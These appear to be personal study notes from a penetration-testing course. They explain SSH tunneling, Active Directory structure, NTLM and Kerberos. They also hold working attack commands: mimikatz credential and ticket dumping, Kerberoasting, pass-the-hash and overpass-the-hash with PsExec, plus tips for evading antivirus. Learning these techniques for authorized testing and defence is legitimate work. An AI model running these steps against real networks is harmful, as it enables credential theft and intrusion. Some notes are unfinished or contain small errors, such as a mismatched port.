     [[https://en.wikipedia.org/wiki/Security_Accounts_Manager]]
     + %SystemRoot%/system32/config/SAM
       - filesystem lock : the file cannot be accessed because the file is open in system. unless the system is shut down or blue screen exception has been thrown.
       - however, memory dump possible.
     + user passwords hash type:
       - LAN Manager (LM) hash, based on DES
       - NT LAN Manager (NTLM) hash, MD4
         
* Book3_Chapter 20 Port Redirection and Tunneling
  + ssh bind forward
  + https encapsulated forward
    
** ssh port forwarding
   + src:
   #+begin_src sh
ssh -L [bind_address:]<localPort>[[:remoteHost]:remotePort] <id>@<remoteHost>
  # the <localHost> will listen to <localPort> during the ssh session, and forward all inbound traffic to remotePort.
  # *-L must specify the remote destination port*: to communicate with the sshServer:dstPort

ssh –L 5901:10.10.0.5:3306 user@example.com
  # local port 5901 will be forward to user@example.com at ip 10.10.0.5 through ssh, to remote port 4492. Useful for accessing remote services (database server, etc.)

ssh -R [bind_address:]<remotePort>[[:host]:hostport] <id>@<remoteHost> 
  # the <remoteHost> will listen to <remotePort> during the ssh session, and forward all inbound traffic to host:hostport or the ssh client(localhost) by default.

ssh -D [bind_address:]<localPort> <id>@<remoteHost>
  # SOCK4/5 supported(man 1 ssh, 2020). application level dynamical forwarding. Listen to local port <localPort>, forward any incoming traffic to <id>@<remoteHost>, outbound port on the remote machine is then determined by application level protocol.
  # *-D cannot specify the remote destination port*: use the ssh-server as a proxy.
   #+end_src
   
*** ssh tricks
    + src: 
    #+begin_quote
~?' Display a list of escape characters.
~.' Disconnect.
~^Z' Background ssh.
~#' List forwarded connections.
~&' Background ssh at logout when waiting for forwarded connection / X11 sessions to terminate.
~B' Send a BREAK to the remote system (only useful for SSH protocol version 2 and if the peer supports it).
~C' Open command line. Currently this allows the addition of port forwardings using the -L, -R and -D options (see above)....
~R' Request rekeying of the connection (only useful for SSH protocol version 2 and if the peer supports it).
    #+end_quote
    
* Book3_Chapter 21 Active Directory Attacks
  
** misc
  + versions of windows server
    - the "desktop"
    - Server Core (since Windows Server 2008 R2, minimal server without GUI)
    - Server Nano (since Windows Server 2016, more minimal than Server Core, not eligible as Domain Controller)
 
** Active Directory Theory
*** Lightweight Directory Access Protocol(LDAP)
    + docs:
      - [[https://ldapwiki.com/wiki/][LDAPwiki]]
    // TODO p627 links
    + LDAP URI scheme:
      [[https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol]]
      
    + LDAP provider path:
      - src:
      #+begin_src powershell
LDAP://HostName[:PortNumber][/DistinguishedName]
      #+end_src
      - [[https://msdn.microsoft.com/en-us/library/aa746384(v=vs.85).aspx]]
    + CN : Common Name
    + OU : Organizational Unit
    + DC : Domain Component
    #+CAPTION: OU is like folder, and CN anything else
    [[./img/b3cp21_cn_ou.png]]
   
*** components::Domain Controller (DC)
    + about:
    #+begin_quote
    Active Directory consists of several components. The most important component is the domain controller (DC), which is *a Windows 2000-2019 server with the Active Directory Domain Services role installed*. The domain controller is the hub and core of Active Directory because it stores all information about how the specific instance of Active Directory is configured. It also enforces a vast variety of rules that govern how objects within a given Windows domain interact with each other, and what services and tools are available to end users.
    #+end_quote
    + Readings
      - [[https://technet.microsoft.com/library/cc786438(v=ws.10).aspx][MS doc-Domain Controller Roles]]

    + about:
    #+begin_quote
    When an instance of Active Directory is configured, a domain is created with a name such as corp.com where corp is the name of the organization. Within this domain, we can add various types of objects, including computer and user objects.
    #+end_quote
*** components::Organizational Units (OU)
    + about:
    #+begin_quote
    System administrators can (and almost always do) organize these objects with the help of Organizational Units (OU). OUs are comparable to file system folders in that they are containers used to store and group other objects. Computer objects represent actual servers and workstations that are domain-joined (part of the domain), and user objects represent employees in the organization. All AD objects contain attributes, which vary according to the type of object. For example, a user object may include attributes such as first name, last name, username, and password.
    #+end_quote
     [[https://technet.microsoft.com/en-us/library/cc978003.aspx]]
     
*** FSMO roles
    + info:
 [[https://support.microsoft.com/en-gb/help/197132/active-directory-fsmo-roles-in-windows]]
    #+begin_quote
    Active Directory is the central repository in which all objects in an enterprise and their respective attributes are stored. It is a hierarchical, multi-master enabled database, capable of storing millions of objects. Because it is multi-master, changes to the database can be processed at any given domain controller (DC) in the enterprise regardless of whether the DC is connected or disconnected from the network.
    #+end_quote
    + AD is *multi-master enabled* database. This model allows the flexibility that change could occur at any Domain Controller(DC) in the enterprise. However, this model could also possibility leads to conflicts(under race condition). To resolve this problem, AD use algorithm e.g. last writer wins. Or, to prevent the conflict use *Single-master model* in some cases.
    #+begin_quote
    To prevent conflicting updates in Windows, the Active Directory performs updates to certain objects in a single-master fashion. In a single-master model, only one DC in the entire directory is allowed to process updates. This is similar to the role given to a primary domain controller (PDC) in earlier versions of Windows (such as Microsoft Windows NT 3.51 and 4.0), in which the PDC is responsible for processing all updates in a given domain.

    Active Directory extends the single-master model found in earlier versions of Windows to include multiple roles, and the ability to transfer roles to any DC in the enterprise. Because an Active Directory role is not bound to a single DC, it is referred to as an FSMO role. Currently in Windows there are five FSMO roles:

    1. *Schema Master* - (one per forest?).
       + The schema master FSMO role holder is the DC responsible for performing updates to the directory schema (that is, the schema naming context or LDAP://cn=schema,cn=configuration,dc=<domain>). This DC is the only one that can process updates to the *directory schema*. Once the Schema update is complete, it is replicated from the schema master to all other DCs in the directory. There is only one schema master per directory.

    2. *Domain Naming Master* - (one per forest?).
       + The domain naming master FSMO role holder is the DC responsible for making changes to the forest-wide domain name space of the directory (that is, the Partitions\Configuration naming context or LDAP://CN=Partitions, CN=Configuration, DC=<domain>). This DC is the only one that can add or remove a domain from the directory. It can also add or remove cross references to domains in external directories.

    3. *Relative ID (RID) Master* - (one per domain?).
       + The RID master FSMO role holder is the single DC responsible for processing RID Pool requests from all DCs within a given domain. It is also responsible for removing an object from its domain and putting it in another domain during an object move.
       + When a DC creates a security principal object such as a user or group, it attaches a unique Security ID (SID) to the object. This SID consists of a domain SID (the same for all SIDs created in a domain), and a relative ID (RID) that is unique for each security principal SID created in a domain.
       + Each Windows DC in a domain is allocated a pool of RIDs that it is allowed to assign to the security principals it creates. When a DC's allocated RID pool falls below a threshold, that DC issues a request for additional RIDs to the domain's RID master. The domain RID master responds to the request by retrieving RIDs from the domain's unallocated RID pool and assigns them to the pool of the requesting DC. There is one RID master per domain in a directory.

    4. *Primary Domain Controller (PDC) Emulator* - (one per domain?).
       + The PDC emulator is necessary to synchronize time in an enterprise. Windows includes the W32Time (Windows Time) time service that is required by the Kerberos authentication protocol. All Windows-based computers within an enterprise use a common time. The purpose of the time service is to ensure that the Windows Time service uses a hierarchical relationship that controls authority and does not permit loops to ensure appropriate common time usage.
       + The PDC emulator of a domain is authoritative for the domain. The PDC emulator at the root of the forest becomes authoritative for the enterprise, and should be configured to gather the time from an external source. All PDC FSMO role holders follow the hierarchy of domains in the selection of their in-bound time partner.
       + In a Windows domain, the PDC emulator role holder retains the following functions:
         - Password changes performed by other DCs in the domain are replicated preferentially to the PDC emulator.
         - Authentication failures that occur at a given DC in a domain because of an incorrect password are forwarded to the PDC emulator before a bad password failure message is reported to the user.
         - Account lockout is processed on the PDC emulator.
         - The PDC emulator performs all of the functionality that a Microsoft Windows NT 4.0 Server-based PDC or earlier PDC performs for Windows NT 4.0-based or earlier clients.
       + ... (changelogs for pre-Windows 2000 system)

    5. *Infrastructure Master* - (one per domain?).
       + When an object in one domain is referenced by another object in another domain, it represents the reference by:
         - The GUID
         - The SID (for references to security principals)
         - The DN of the object being referenced

       + The infrastructure FSMO role holder is the DC responsible for updating an object's SID and distinguished name in a cross-domain object reference.
    #+end_quote

** Active Directory Enumeration
   + typically begins with a breach on a domain workstation or server, providing initial access, followed by enumeration of the AD environment.
   + goal: privilege escalation until gain control of domains. methods:
     - compromise a user of high-privilege group(e.g. Domain Admins group)
     - compromise a domain controller
       #+begin_quote
       ...since it may be used to modify all domain-joined computers or execute applications on them. Additionally, as we will see later, the domain controller contains all the password hashes of every single domain user account.
       #+end_quote
*** first goal::enumerate the domain users and learn as much as we can about their group memberships in search of high-value targets.
    
**** Traditional Approach : net.exe
     + src:
     #+begin_src powershell
net user                           # enum all local accounts
net user /domain                   # enum all users in the domain
  #### adam Guest iis_service sql_service jeff_admin
net user jeff_admin /domain
net group /domain                  # enum all groups in the domain
  #### *Secret_Group *Nested_Group
  
net group <global_security_group> /domain        # enum all group users
net localgroup <domain_local_security_group> /domain
     #+end_src
     + info:
       - Nested Group
       #+begin_quote
In Active Directory, a group (and subsequently all the included members) can be added as member to another group. This is known as a nested group.
       #+end_quote
       - TODO ?
       #+begin_quote
Unfortunately, the net.exe command line tool cannot list nested groups and only shows the direct user members. Given this and other limitations, we will explore a more flexible alternative in the next section that is more effective in larger real-world environments.
       #+end_quote
       
**** A Mordern Approach : 
     + other approaches:
       - Get-ADUser: powershell Remote Server Administration Tools (RSAT). need admin privilege to run.
         [[https://technet.microsoft.com/en-us/library/gg413289.aspx]]
     
     + a script:
       - overview:
       #+begin_quote
As an overview, this script will *query the network for the name of the Primary domain controller emulator and the domain*, *search Active Directory and filter the output to display user accounts*, and then clean up the output for readability.
       #+end_quote
       + use a DirectorySearcher object, to query the AD using LDAP.
       + The LDAP needs:
         - target hostname
         - DistinguishedName (DN) of the domain

       - src:
    #+begin_src powershell
## [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
## get a domain object

[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    ## Forest : corp.com
    ## DomainControllers : {DC01.corp.com}
    ## Children : {}
    ## DomainMode : Unknown
    ## DomainModeLevel : 7
    ## Parent :
    ## PdcRoleOwner : DC01.corp.com
    ## RidRoleOwner : DC01.corp.com
    ## InfrastructureRoleOwner : DC01.corp.com
    ## Name : corp.com
    #+end_src

    #+begin_src powershell
## build the LDAP search string with the domain object

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$SearchString

## LDAP://<PdcRoleOwner>/<Name.split('.')...>
## LDAP://DC01.corp.com/DC=corp,DC=com

## instantiate Searcher, Searcher.SearchRoot set to the entire AD
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain

## set filters, or search: *LDAP Famous filters*
$Searcher.filter="samAccountType=805306368"

    ## $Searcher.FindAll()

    ## | Path                                            | Properties      |
    ## |-------------------------------------------------+-----------------|
    ## | LDAP://CN=Administrator,CN=Users,DC=corp,DC=com | {admincount...} |
    ## | LDAP://CN=Guest,CN=Users,DC=corp,DC=com         | {iscritical...} |

$Result = Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    Write-Host"------------------------"
}
    #+end_src
    - TODO p632 script modifications, other filters, lab
***** Resolving Nested Groups
      
TODO p632
TODO the reason

***** Current Logged on Users
     + [[https://medium.com/@sixdub]]
     + [[https://medium.com/@sixdub/derivative-local-admin-cdd09445aac8]]

     + NetWkstaUserEnum (need admin privilege)
[[https://msdn.microsoft.com/en-us/library/windows/desktop/aa370669(v=vs.85).aspx]]
     + NetSessionEnum
[[https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum]]

     + info:
     #+begin_quote
     During an assessment, after compromising a domain machine, we should enumerate every computer in the domain and then use *NetWkstaUserEnum* against the obtained list of targets. Keep in mind that this API *will only list users logged on to a target if we have local administrator privileges* on that target.
     Alternatively we could focus our efforts on discovering the domain controllers and any potential file servers (based on servers hostnames or open ports) in the network and use *NetSessionEnum* against these servers in order to enumerate all active users’ sessions.
     #+end_quote

     + the *PowerView*, one common solution to avoid endpoint dectection.
       [[https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1]]
     + src:
     #+begin_src powershell
     TODO p636, init && src
     #+end_src
     
*** Enumeration Through Service Principal Names (the service accounts)
    + info:
    #+begin_quote
    [...]
    An alternative to attacking a domain user account is to target so-called service accounts, which may also be members of high value groups.
    When an application is executed, it must always do so in the context of an operating system user.
    If a user launches an application, that user account defines the context. However, services launched by the system itself use the context based on a Service Account.
    In other words, isolated applications can use a set of predefined service accounts: *LocalSystem*, *LocalService*, and *NetworkService*.
    For more complex applications, a domain user account may be used to provide the needed context while still having access to resources inside the domain.
    When applications like Exchange, SQL, or Internet Information Services (IIS) are integrated into Active Directory, a unique service instance identifier known as a *Service Principal Name (SPN)*  is used to associate a service on a specific server to a service account in Active Directory.
    [...]
    #+end_quote
    #+begin_quote
*Managed Service Accounts*, introduced with Windows Server 2008 R2, were designed for complex applications which require tighter integration with Active Directory. Larger applications like SQL and Microsoft Exchange often require server redundancy when running to guarantee availability, but Managed Service Accounts cannot support this. To remedy this, *Group Managed Service Accounts* were introduced with Windows Server 2012, but this requires that domain controllers run Windows Server 2012 or higher. Because of this, many organizations still rely on basic Service Accounts.
    #+end_quote
    + Aim: 
    #+begin_quote
    By enumerating all registered SPNs in the domain, we can obtain the IP address and port number of applications running on servers integrated with the target Active Directory, limiting the need for a broad port scan.
    #+end_quote
    + Method:
      - query the DC, search for specific *serviceprincipalname*.
    [[./AD_Enum.ps1]]
      - serviceprinciplename {HTTP/CorpWebServer.corp.com}
      - which reveals the url. use e.g. nslookup, for further info
        
**  Active Directory Authentication
    #+begin_quote
    Active Directory uses either Kerberos or NTLM authentication protocols for most authentication attempts. We will discuss the simpler NTLM protocol first.
    #+end_quote
    + docs:
      - [[https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf]] 
    + the hashing related service: Local Security Authority Subsystem Service (LSASS)

*** NTLM Authentication
    #+begin_quote
    NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos authentication. 
    #+end_quote
    + steps(a client login to an application server):
      - 1. client *calculate NTLM hash from the user's password*;
      - 2. client computer *send the username* to the application server;
      - 3. application server replies a random value called the *nonce* or *challenge* back to the client;
      - 4. client *encrypts the nonce using the NTLM hash*, as *response* and send it back to the application server.
      - 5. application server forwards the *response*, the *username*, and the *nonce* to the DC;
      - 6. DC encrypt the nonce again, with the user's NTLM hash and compare the result with the *response*, approve the authentication request if the comparison returns equal. DC knows all users' NTLM hash.

    + hence pass-the-hash is possible knowing NTLM hash.
    + the NTLM auth may leave footprint in eventlog.

| src        | ---pl-->                    | dst        |
| ---------- | --------------------------- | ---------- |
| client     | username                    | app-server |
| app-server | nonce                       | client     |
| client     | res(NTLM hash hashed nonce) | app-server |
| app-server | res, username, nonce        | DC         |
| DC         | auth-result                 | app-server | 

*** Kerboros Authentication
  + docs:
    - [[https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf]]
    - [[https://www.ietf.org/rfc/rfc4120.txt][RFC4120::The Kerberos Network Authentication Service (V5)]]
    - [[https://tools.ietf.org/html/rfc4757][RFC4757::The RC4-HMAC Kerberos Encryption Types Used by Microsoft Windows]] has further reference to the key encryption scheme or negotiation scheme used by Kerboros.
    - [[https://tools.ietf.org/html/rfc8009][RFC8009::AES Encryption with HMAC-SHA2 for Kerberos 5]]
      
  + info:
    - the default authentication protocol since Windows Server 2003.
    - "While NTLM authentication works through a principle of challenge and response, Windows-based Kerberos authentication uses a ticket system."
    - "At a high level, Kerberos client authentication to a service in Active Directory involves the use of a domain controller in the role of a *Key Distribution Center*, or *KDC*" 
[[./img/b3cp21_KerberosFlow.png]]
 
  + the basic: 
  #+begin_quote
  The basic Kerberos authentication process proceeds as follows: A client sends a request to the authentication server (AS) for "credentials" for a given server. *The AS responds with these credentials, encrypted in the client's key. The credentials consist of a "ticket" for the server and a temporary encryption key (often called a "session key").* The client *transmits the ticket (which contains the client's identity and a copy of the session key, all encrypted in the server's key) to the server.* The session key (now shared by the client and server) is used to authenticate the client and may optionally be used to authenticate the server. It may also be used to encrypt further communication between the two parties or to exchange a separate sub-session key to be used to encrypt further communication.
  #+end_quote

  + vectors 0:
  #+begin_quote
  Implementation of the basic protocol consists of one or more authentication servers running on *physically secure* hosts.
  #+end_quote

  + vectors 1:
  #+begin_quote
  There are two basic methods by which a client can ask a Kerberos server for credentials. In the first approach, the client sends a *cleartext request* for a ticket for the desired server to the AS. The reply is sent encrypted in the client's secret key. Usually this request is for a ticket-granting ticket (TGT), which can later be used with the ticket-granting server (TGS). In the second method, the client sends a request to the TGS. The client uses the TGT to authenticate itself to the TGS in the same manner as if it were contacting any other application server that requires Kerberos authentication. The reply is encrypted in the session key from the TGT. Though the protocol specification describes the AS and the TGS as separate servers, in practice they are implemented as different protocol entry points within a single Kerberos server.
  #+end_quote
  #+begin_quote
  To verify the identities of the principals in a transaction, the client transmits the ticket to the application server. Because the ticket is sent "in the clear" (parts of it are encrypted, but this encryption doesn't thwart replay) and might be intercepted and reused by an attacker, additional information is sent to prove that the message originated with the principal to whom the ticket was issued. This information (called *the authenticator) is encrypted in the session key and includes a timestamp.* The timestamp proves that the message was recently generated and is not a replay. Encrypting the authenticator in the session key proves that it was generated by a party possessing the session key. Since no one except the requesting principal and the server know the session key (it is never sent over the network in the clear), this guarantees the identity of the client.
  The integrity of the messages exchanged between principals can also be guaranteed by using the session key *(passed in the ticket and contained in the credentials).* This approach provides detection of both replay attacks and message stream modification attacks.
  #+end_quote
  + nouns:
    - Credentials:
    #+begin_quote
    A *ticket plus the secret session key* necessary to use that ticket successfully in an authentication exchange. 
    #+end_quote
    - Ticket:
    #+begin_quote
    A record that helps a client authenticate itself to a server; it contains the client's identity, a session key, a timestamp, and other information, all sealed using the server's secret key. It only serves to authenticate a client when presented along with a fresh Authenticator.
    #+end_quote


**** steps: The Authentication Service (AS) Exchange (RFC 4120::3.1) (user get the TGT)

  | Message direction  | Message type            |
  |--------------------+-------------------------|
  | client to Kerberos | KRB_AS_REQ              |
  | Kerberos to client | KRB_AS_REP or KRB_ERROR |

  #+begin_quote
  The Authentication Service (AS) Exchange between the client and the Kerberos Authentication Server is initiated by a client when it wishes to obtain authentication credentials for a given server but currently holds no credentials.
  #+end_quote 
    - 1. user login to workstation: user send *[KRB_]AS_REQ* ((Kerberos) Authentication Service Request) which contains username and a encrypted timestamp. The timestamp is encrypted using a *hmac* (Hash-based Message Authentication Code) derived from the user's password, to the *KDC* . For the hmac, see the docs section above, some older version use *rc4_hmac_nt* which is NTLM/md4 hash.
[[./img/b3cp21_KerberosPreAuth.png]]
    - 2. the *KDC*, also knows the *hmac*, will validate the authentication if it can decrypt the timestamp with the *hmac*. If auth success, a *TGT* (Ticket Granting Ticket) representing the user in the domain for a specified period, will be issued and send back in the *[KRB_]AS_REP* to the client. The KDC considers the client auth complete once the client has received the session key and the *TGT*.

      + "This *TGT* is encrypted with a key(the *hmac* of the *krbtgt* account) shared between all KDC", "The *TGT* contains information regarding the user, including group memberships, the domain, a time stamp, the IP address of the client, and the session key."

[[./img/b3cp21_KerberosTGT.png]]
      + the *[KRB_]AS_REP* also contains a session key(i.e. two copies, one in the AS_REP, another sealed in the TGT) since Kerberos is stateless. the session key is encrypted using the user's *hmac* .
      #+begin_quote RFC4120 3.1.
      The response, *KRB_AS_REP* , contains a ticket for the client to present to the server, and a session key that will be shared by the client and the server. The session key and additional information are encrypted in the client's secret key.
      #+end_quote

      + The *TGT* will be valid for 10 hours by default, after that a renewal occurs. "This renewal does not require the user to re-enter the password."
    
    - the *krbtgt* account's *hmac* only changes in rare cases (in some enterprises "the pw hasn't changed in years")
      + upgrade of domain functional level
      + direct recovery
      + manually changed (compromise recovery)
    - the ticket is ASN.1 encoded? tool::OpenSSL
    
**** steps: The Ticket-Granting Service (TGS) Exchange (user get a TGS)

  | Message direction  | Message type             |
  |--------------------+--------------------------|
  | client to Kerberos | KRB_TGS_REQ              |
  | Kerberos to client | KRB_TGS_REP or KRB_ERROR |

  + TGS Exchange, the overview:
  #+begin_quote
  The TGS exchange between a client and the Kerberos TGS is *initiated by a client* when it seeks to obtain authentication credentials for a given server (which might be registered in a remote realm), when it seeks to renew or validate an existing ticket, or when it seeks to obtain a proxy ticket. In the first case, the client must already have acquired a ticket for the Ticket-Granting Service using the AS exchange (the TGT is usually obtained when a client initially authenticates to the system, such as when a user logs in).
  
  The message format for the TGS exchange is almost identical to that for the AS exchange.  The primary difference is that *encryption and decryption* in the TGS exchange does not take place under the client's key. Instead, *the session key from the TGT or renewable ticket,* or sub-session key from an Authenticator is used.  As is the case for all application servers, expired tickets are not accepted by the TGS, so once a renewable or TGT expires, the client must use a separate exchange to obtain valid tickets. (RFC 4120::3.3)
  #+end_quote

  + TGS Exchange, client side:
    - user wishes to access resources of the domain (e.g. something with a registered *SPN*): client constructs a *KRB_TGS_REQ* (Ticket Granting Service Request) packet "that consists of *the current user* and a *timestamp (encrypted using the session key),*  *the SPN of the resource,* and *the encrypted TGT.*" (and the session key)
    #+begin_quote
    The client prepares the KRB_TGS_REQ message, providing an authentication header as an element of the padata field, and including the same fields as used in the KRB_AS_REQ message along with several optional fields: the enc-authorizatfion-data field for application server use and additional tickets required by some options. ( RFC4120 3.3.1. Generation of KRB_TGS_REQ Message)
    #+end_quote

  + TGS Exchange, server side, additional checks
    - First, the Kerberos server will determine which key should be used to decrypt the TGT. (if the SPN exists in this domain then use the TGS's key, if the TGT was issued by another realm then use inter-realm key.)
      #+begin_quote
      (...), the ticket granting service on the KDC receives the TGS_REQ, and if the SPN exists in the domain, the TGT is decrypted using the secret key known only to the KDC. (PWK p646)
      #+end_quote
    - Next, the session key is extracted from the TGT, and used to decrypt other info in the TGS_REQ, and perform several checks.
      #+begin_quote
      The session key is then extracted from the TGT and used to decrypt the username and timestamp of the request. As this point the KDC performs several checks:
      1. The TGT must have a valid timestamp (no replay detected and the request has not expired).
      2. The username from the TGS_REQ has to match the username from the TGT.
      3. The client IP address needs to coincide with the TGT IP address. (PWK p646)
      #+end_quote

    - If valid, server send the *TGS_REP*
      #+begin_quote
      (...) ( the *TGS_REP* ) packet contains three parts:
      1. The SPN to which access has been granted.
      2. A session key to be used between the client and the SPN.
      3. A service ticket containing the username and group memberships along with the newly-created session key. 

      The first two parts (SPN and session key) are encrypted *using the session key associated with the creation of the TGT* and the service ticket is encrypted using *the password hash of the service account registered with the SPN* in question.
      #+end_quote

    - When the TGS Exchange is complete, the client should have both a session key and a service ticket. Then the service authentication begins.

**** steps: The Client/Server (CS) Authentication Exchange (RFC4120::3.2) (user use a TGS)

| Message direction              | Message type            |
| ------------------------------ | ----------------------- |
| Client to Application server   | KRB_AP_REQ              |
| [optional] Ap server to Client | KRB_AP_REP or KRB_ERROR |

    - CS Exchange Overview:
      #+begin_quote
      The client/server authentication (CS) exchange is used by network applications to authenticate the client to the server and vice versa. The client MUST have already acquired credentials for the server using the AS or TGS exchange. (RFC4120::3.2)
      #+end_quote
  
    - Client need to obtain the service ticket from some source, before initiating a CS Exchange:
      #+begin_quote 
      the client "obtains (either through a credentials cache, the AS exchange, or the TGS exchange) a ticket and session key for the desired service." (RFC4120::3.2.2.)
      #+end_quote
  
    - General Flow:
      #+begin_quote
      Passing these checks provides only authentication of the named principal; it does not imply authorization to use the named service. Applications MUST make a separate authorization decision based upon the authenticated name of the user, the requested operation, local access control information such as that contained in a .k5login or .k5users file, and possibly a separate distributed authorization service. (RFC4120::3.2.3.)
      #+end_quote
  
      #+begin_quote
      First, the client sends to the application server an application request or *AP_REQ* , which includes *the username and a timestamp encrypted with the session key associated with the service ticket along with the service ticket itself.* (note: the session key in the TGS_REP)
  
      The application server *decrypts the service ticket using the(note: its) service account password hash* and extracts the username and the session key. It then *uses the latter to decrypt the username from the AP_REQ.* If the AP_REQ username matches the one decrypted from the service ticket, the request is accepted. Before access is granted, the service inspects the supplied group memberships in the service ticket and assigns appropriate permissions to the user, after which the user may access the requested service. (PWK)
      #+end_quote

*** Cached Credential Storage and Retrieval
    - docs:
      + [[https://technet.microsoft.com/en-us/library/cc961760.aspx][Security Subsystem Architecture]]

    - Target::the Cached Credentials
      #+begin_quote
      Since Microsoft’s implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request. In current versions of Windows, these hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space. 

      If we gain access to these hashes, we could crack them to obtain the cleartext password or reuse them to perform various actions. (PWK)
      #+end_quote 
    
    - Problems:
      + need SYSTEM(local administrator) privilege, since LSASS runs as SYSTEM.
      + the LSASS data is encrypted with an LSASS-store key.
      + the in-memory data structures used by LSASS is not publicly documented.

    - Hence, tools created to tackle the problem and extract the hashes.
      + Mimikatz

**** Mimikatz
     + AV Evasion
       - Either: run directly from memory use injector like Powershell.
       [[https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1]]
         + acquire SeDubugPrivlege(require local admin), with allows a process to "debug and adjust the memory of a process owned by another account.(MS doc: [[https://docs.microsoft.com/ja-jp/windows/win32/secauthz/privilege-constants][privilege-constants]])"
         + or if with SYSTEM account, scheduled tasks, psexec -s ..., (the module sekurlsa) work without the debug privilege ([[https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa]]).

       - Or: dump the entire LSASS process memory use built-in tool like Task Manager, then analysis the dump in a helper machine.

     + src:
       #+begin_quote
       C:\Tools\active_directory> mimikatz.exe

       mimikatz # privilege::debug
       Privilege '20' OK

       mimikatz # sekurlsa::logonpasswords 
       [hash dumps]

       mimikatz # sekurlsa::tickets
       [tickets dump]
       (PWK p648) 
       #+end_quote
     
     + TODO: lab p650, && obfuscate mimikatz && memory dump

*** Service Account Attacks 
    + docs:
      - [[https://adsecurity.org/?p=2293][Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain]]

    + info:
      - Since Kerberos TGS exchange only check a user's "authenticity" but not "authority", knowing the SPN, any user could request could request a service ticket from the DC, extract it from the local memory and save it to the disk. Then service account password could be cracked.
      #+begin_quote
      The reason why this attack is successful is that most service account passwords are the same length as the domain password minimum (often 10 or 12 characters long) meaning that even brute force cracking doesn’t likely take longer than the password maximum password age (expiration). Most service accounts don’t have passwords set to expire, so it’s likely the same password will be in effect for months if not years.
      ([[https://adsecurity.org/?p=2293]])
      #+end_quote 

    + src:
    #+begin_src ps
$SPN = 'HTTP/CorpWebServer.corp.com'
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN 
klist
  ## built-in command, display all cached Kerberos tickets for the current user.
  ## TODO: find SPNs using LDAP filtering
    #+end_src
    #+begin_src
       C:\Tools\active_directory> mimikatz.exe

       mimikatz # privilege::debug
       Privilege '20' OK

       mimikatz # kerberos::list /export 
    #+end_src
    
**** Kerberoasting?
     + docs:
       - [[https://github.com/nidem/kerberoast]]

     + about: 
       - Enumerate SPNs(LDAP) -> request TGSs -> crack weak passwords(espically rc4-hmac) offline -> ?
       - there is a kerberoast package.
       //TODO
    
     + src:
     #+begin_src sh
sudo apt update && sudo apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <TGS ticketFile> 
     #+end_src 

**** ? Low and Slow Password Guessing

** Active Directory Lateral Movement
*** Pass the Hash (PtH)
    + docs:
    [[https://msdn.microsoft.com/en-us/library/windows/desktop/ms685150(v=vs.85).aspx][Service Control Manager]] 

    + pass the NTLM hash via Server Message Block (SMB) protocol.
    + more:
    #+begin_quote
    Most tools built to exploit PtH create and start a Windows service (for example cmd.exe or an instance of PowerShell) and communicate with it using Named Pipes. This is done using the *Service Control Manager* API. 
    (PWK p657)
    #+end_quote 
    + src:
    #+begin_src sh
    pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2 eb3b9f05c425e //10.11.0.22 cmd 
      ## pth-winexe -U [DOMAIN/]USERNAME[%PASSWORD]
    #+end_src
    #+begin_quote
    This method works for Active Directory domain accounts and the built-in local administrator account. Since the 2014 security update, this technique can not be used to authenticate as any other local admin account. 
    #+end_quote

*** Overpass the Hash (access resources with NTLM hash, convert NTLM to TGT, remote code execution with TGT)
    + docs 
      - [[https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf]] 
    + win 10 will temporarily cache credentials after an successful UAC (e.g. run as Administrator -> Run as different user).
    + src: ## pass the ntlm hash
    #+begin_src powershell
    mimikatz # sekurlsa::logonpasswords
    /**
     * result: 
     * \* NTLM : e2b475c11da2a0748290d87aa966c327
     */

    mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe 
    /**
     * the /ntlm:<hash>: logon as the user using the NTLM hash
     * the domain is Kerberos domain?
     */
    
    PS C:\Windows\system32> klist 
    /**
    * display cached Kerberos tickets for the current user
    * (no ticket right now)
    */

    net use [e:] \\financial\letters\User2
    /**
     * could be any command that requires domain permissions and would subsequently create a TGS.
     * net use [{<DeviceName> | *}] [\\<ComputerName>\<ShareName>[\<volume>]]
     * more on MS doc
     */

    PS C:\Windows\system32> klist 
    /**
    * 2 tickets, TGT + TGS for the CIFS service
    */

    PS C:\Tools\active_directory> .\PsExec.exe \\financial cmd.exe
    /**
    * reuse the TGT to gain code execution. 
    * PsExec is an MS official tool that can run a command remotely but does not accept password hashes.
    */

    (PWK p659)
    #+end_src 

*** Pass the Ticket
      

* TODO list
  + nmap: quick, full
  + dirb
